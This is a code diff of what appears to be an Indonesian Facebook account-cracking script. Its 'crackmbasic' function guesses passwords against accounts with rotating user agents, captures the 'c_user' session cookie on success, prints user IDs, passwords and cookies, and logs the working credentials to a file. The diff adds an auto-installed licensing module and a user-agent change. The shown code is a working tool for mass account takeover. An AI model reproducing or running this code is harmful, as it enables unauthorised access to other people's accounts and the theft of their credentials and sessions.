@@ -1,6 +1,11 @@
 import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid,calendar
 #------------------[  MODULE  ]-------------------#
 try:
+    import licensing
+except ImportError:
+    print('• Sedang Menginstall Modul licensing •')
+    os.system('pip install licensing')
+try:
         import rich
 except ImportError:
         print('• Sedang Menginstall Modul Rich •')
@@ -42,6 +47,8 @@ from rich.markdown import Markdown as mark
 from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
+from licensing.models import *
+from licensing.methods import Key, Helpers
 
 #------------------[ GLOBAL NAME ]-------------------#
 sekarang = calendar.timegm(time.gmtime(time.time()))
@@ -1220,7 +1227,7 @@ def crackmbasic(idf,pwv,awal):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(free) 
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(ugen)
 	ses = requests.Session()
 	ahir = str(datetime.now()-awal).split('.')[0]
 	prog.update(des,description=f'\r[bold white]Mbasic [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
@@ -1247,6 +1254,7 @@ def crackmbasic(idf,pwv,awal):
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
 				print(f'\r{U}[{P}☕{U}] {P}USER   : {h}{idf} {P}<=>{tahun(idf)}\n\r{U}[{P}☕{U}] {P}PASS   : {h}{pw}\n\r{U}[{P}☕{U}] {P}COKI   : {u}{kuki}\n') 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				#cek_apk(session,coki)
 				break
 				
 			else:
